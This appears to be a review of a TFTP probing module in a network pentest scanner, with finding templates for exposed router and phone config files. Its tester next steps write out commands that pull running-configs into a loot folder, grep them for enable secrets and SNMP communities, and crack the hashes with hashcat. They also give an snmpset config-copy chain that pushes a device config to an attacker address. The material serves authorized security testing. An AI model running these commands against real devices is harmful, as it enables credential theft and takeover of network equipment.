summary: tftp module is small but hits the right primitive: UDP RRQ against a curated list of vendor config filenames (running-config, startup-config, config.text, vlan.dat, router.cfg, sipdefault.cnf, SEPDEFAULT.cnf, etc.). Emits tftp_readable (critical when the hit is a device config — first 200 bytes returned as hex proof) or tftp_open (medium, server answered but no known files). Biggest gap: candidate list is very small (10 entries); no attempt to walk phone-provisioning conventions (SEP<MAC>.cnf.xml with MAC harvested from other services), no chain into SNMP RW community for the classic config-copy pivot (mentioned in runbook, not automated), and no write-probe.

findings.title_pattern: TFTP serves vendor config / provisioning files unauthenticated
findings.tier_evidence: TFTP DATA block-1 actually returned for a probed filename (first 200 bytes retained as hex sample) — a proven read of a device config/provisioning bundle with zero auth (T2 arbitrary-read primitive; T3 realistically because the file IS the running-config with enable-secret and community strings).
findings.promotion_notes: Auto-pull the full file (loop until block < 512 bytes), parse for enable-secret / community strings / SIP credentials, feed known_creds. Currently only samples the first 200 bytes.
findings.tester_next_step: atftp --get -r running-config -l loot/IP-running-config IP ; grep -Ei 'enable secret|snmp-server community|username|line vty' loot/IP-running-config ; hashcat -m 500 (type 5) or -m 9200 (type 8) enable-secret.

findings.tier_evidence: Server answered at least one probe (with error code) — TFTP is confirmed live, but no known filename was readable.
findings.promotion_notes: Expand candidate list (nmap tftp-enum ships ~200 vendor paths); chain SNMP-RW-community discovery: use snmpset ... configCopyProtocol=TFTP + configCopySourceFileName='running-config' + configCopyDestinationFileName='pwn' + configCopyDestinationAddressType=1 + configCopyDestinationAddress=<attacker> to push the config, then read it via TFTP here.
findings.tester_next_step: nmap -sU -p69 --script tftp-enum IP ; for RW community: snmpset -v2c -c <RW> IP 1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1 ... (Cisco config-copy MIB); then get the pushed file locally via tftp; grep enable-secret.
